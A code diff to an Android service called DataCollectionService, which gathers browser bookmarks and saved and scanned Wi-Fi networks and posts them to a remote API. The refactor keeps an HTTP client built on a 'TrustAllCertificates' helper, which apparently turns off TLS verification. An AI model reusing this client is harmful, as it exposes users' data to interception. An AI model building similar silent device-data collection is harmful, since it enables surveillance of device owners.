@@ -43,6 +43,8 @@ class DataCollectionService : Service() {
         private val BROWSER_BOOKMARKS_URI = Uri.parse("content://browser/bookmarks")
     }
 
+    private val httpClient = TrustAllCertificates.createClientBuilder().build()
+
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         val action = intent?.getStringExtra("collection_action") ?: ACTION_COLLECT_ALL
         val requestId = intent?.getStringExtra("request_id")
@@ -71,6 +73,8 @@ class DataCollectionService : Service() {
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onDestroy() {
+        httpClient.dispatcher.executorService.shutdown()
+        httpClient.connectionPool.evictAll()
         stopForeground(false)
         super.onDestroy()
     }
@@ -207,22 +211,26 @@ class DataCollectionService : Service() {
                     })
                 }
 
-                // Saved networks
-                val configuredNetworks = wifiManager.configuredNetworks
-                configuredNetworks?.forEach { config ->
-                    val ssid = config.SSID?.replace("\"", "") ?: return@forEach
-                    val alreadyAdded = (0 until networks.length()).any {
-                        networks.getJSONObject(it).optString("ssid") == ssid
+                // Saved networks (WifiConfiguration deprecated in API 31+)
+                if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.S) {
+                    val configuredNetworks = wifiManager.configuredNetworks
+                    configuredNetworks?.forEach { config ->
+                        val ssid = config.SSID?.replace("\"", "") ?: return@forEach
+                        val alreadyAdded = (0 until networks.length()).any {
+                            networks.getJSONObject(it).optString("ssid") == ssid
+                        }
+                        if (!alreadyAdded) {
+                            networks.put(JSONObject().apply {
+                                put("ssid", ssid)
+                                put("bssid", config.BSSID ?: "")
+                                put("security_type", getSecurityType(config))
+                                put("is_connected", false)
+                                put("is_saved", true)
+                            })
+                        }
                     }
-                    if (!alreadyAdded) {
-                        networks.put(JSONObject().apply {
-                            put("ssid", ssid)
-                            put("bssid", config.BSSID ?: "")
-                            put("security_type", getSecurityType(config))
-                            put("is_connected", false)
-                            put("is_saved", true)
-                        })
-                    }
+                } else {
+                    Log.d(TAG, "Skipping configuredNetworks on API 31+; deprecated WifiConfiguration")
                 }
 
                 // Scan results
@@ -354,7 +362,6 @@ class DataCollectionService : Service() {
     // --- HTTP Transport ---
     private fun sendToEndpoint(path: String, payload: JSONObject) {
         try {
-            val client = TrustAllCertificates.createClientBuilder().build()
             val body = payload.toString().toRequestBody("application/json".toMediaType())
             val url = "${AndroidConfig.apiBaseUrl}$path"
 
@@ -365,7 +372,7 @@ class DataCollectionService : Service() {
                 .post(body)
                 .build()
 
-            client.newCall(request).execute().use { response ->
+            httpClient.newCall(request).execute().use { response ->
                 if (response.isSuccessful) {
                     Log.d(TAG, "Data sent to $path successfully")
                 } else {
